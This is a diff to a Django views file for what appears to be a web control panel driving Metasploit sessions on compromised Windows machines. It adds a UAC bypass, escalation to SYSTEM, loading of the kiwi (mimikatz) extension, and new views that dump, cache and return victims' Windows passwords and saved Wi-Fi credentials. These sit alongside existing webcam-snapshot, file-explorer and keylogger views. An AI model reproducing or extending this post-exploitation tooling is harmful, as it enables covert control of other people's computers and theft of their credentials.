@@ -7,6 +7,7 @@ from core.MsfToolbox import *
 from datetime import datetime
 from django.core.files.storage import FileSystemStorage
 import anssi.settings
+import httplib
 
 import time
 from threading import Thread
@@ -100,11 +101,13 @@ def session(request, id):
 
 def session_information(request, id):
 	try:
-		sysinfo, is_admin, is_system  = toolbox.get_sysinfo(int(id))
+		sysinfo = toolbox.get_sysinfo(int(id))
 	except SessionTimedOutException:
 		return render(request, 'server/session_lost.html', {'id': int(id)})
+	except httplib.CannotSendRequest:
+		return render(request, 'server/error.html')
 
-	return render(request, 'server/session_information.html', {'id': int(id), 'infos': sysinfo, 'is_admin': is_admin, 'is_system': is_system })
+	return render(request, 'server/session_information.html', {'id': int(id), 'infos': sysinfo})
 
 
 def session_close(request, id):
@@ -127,6 +130,8 @@ def action_webcam(request, id):
 		toolbox.post_take_snapshot(session=int(id))
 	except SessionTimedOutException:
 		return render(request, 'server/session_lost.html', {'id': int(id)})
+	except httplib.CannotSendRequest:
+		return render(request, 'server/error.html')
 
 	return redirect(session_webcam, id)
 
@@ -180,6 +185,8 @@ def session_explorer(request, id):
 		(pwd, files, error) = toolbox.ls(shell)
 	except SessionTimedOutException:
 		return render(request, 'server/session_lost.html', {'id': int(id)})
+	except httplib.CannotSendRequest:
+		return render(request, 'server/error.html')
 
 	#toolbox.add_routing_files(files)
 	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd, 'ls_error': error, 'have_uploaded': upload != None, 'have_uploaded_successfully': uploaded})
@@ -227,6 +234,8 @@ def session_keylogger(request, id):
 			return JsonResponse({'value': value})
 	except SessionTimedOutException:
 		return render(request, 'server/session_lost.html', {'id': int(id)})
+	except httplib.CannotSendRequest:
+		return render(request, 'server/error.html')	
 
 	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})
 
@@ -254,10 +263,62 @@ def modulo(num, val):
     return num % val
 
 def session_getadmin(request, id):
-	value = toolbox.start_bypassuac(id)
-	return  JsonResponse({'value': value})
+	toolbox.start_bypassuac(id)
+	time.sleep(3)
+	return redirect(sessions)
+
+def load_kiwi_extension(id):
+	is_admin, is_system = toolbox.get_status(int(id))
+
+	if is_admin and not is_system:
+		toolbox.get_system(int(id))
+		time.sleep(1)
+		is_system = 1
+
+	if is_system:
+		toolbox.load_kiwi(int(id))
+
+	return is_admin, is_system
 
 
-def session_getsystem(request, id):
-	toolbox.get_system(int(id))
-        return JsonResponse({})
+def session_wifi_list(request, id):
+	is_admin, is_system = load_kiwi_extension(id)
+	return render(request, 'server/session_wifi_list.html', {'id': int(id), 'is_admin': is_admin, 'is_system': is_system })
+
+
+def session_passwords(request, id):
+	is_admin, is_system = load_kiwi_extension(id)
+	return render(request, 'server/session_passwords.html', {'id': int(id), 'is_admin': is_admin, 'is_system': is_system })
+
+def session_passwords_async(request, id):
+	creds_file = os.path.join(anssi.settings.MEDIA_ROOT, 'creds', id + '_pass.txt')
+	ret = None
+	if os.path.exists(creds_file):
+		fd = open(creds_file, "r")
+		ret = fd.read()
+		fd.close()
+	else:
+		ret = toolbox.get_creds(int(id))
+		fd = open(creds_file, "w+")
+		fd.write(ret)
+		fd.close()
+		
+	return JsonResponse({'value': ret})
+
+def session_wifi_list_async(request, id):
+	creds_file = os.path.join(anssi.settings.MEDIA_ROOT, 'creds', id + '_wifi.txt')
+	ret = None
+	if os.path.exists(creds_file):
+		fd = open(creds_file, "r")
+		ret = fd.read()
+		fd.close()
+	else:
+		ret = toolbox.get_wifi_creds(int(id))
+		fd = open(creds_file, "w+")
+		fd.write(ret)
+		fd.close()
+
+	return JsonResponse({'value': ret})
+
+def about(request):
+	return render(request, 'server/about.html')
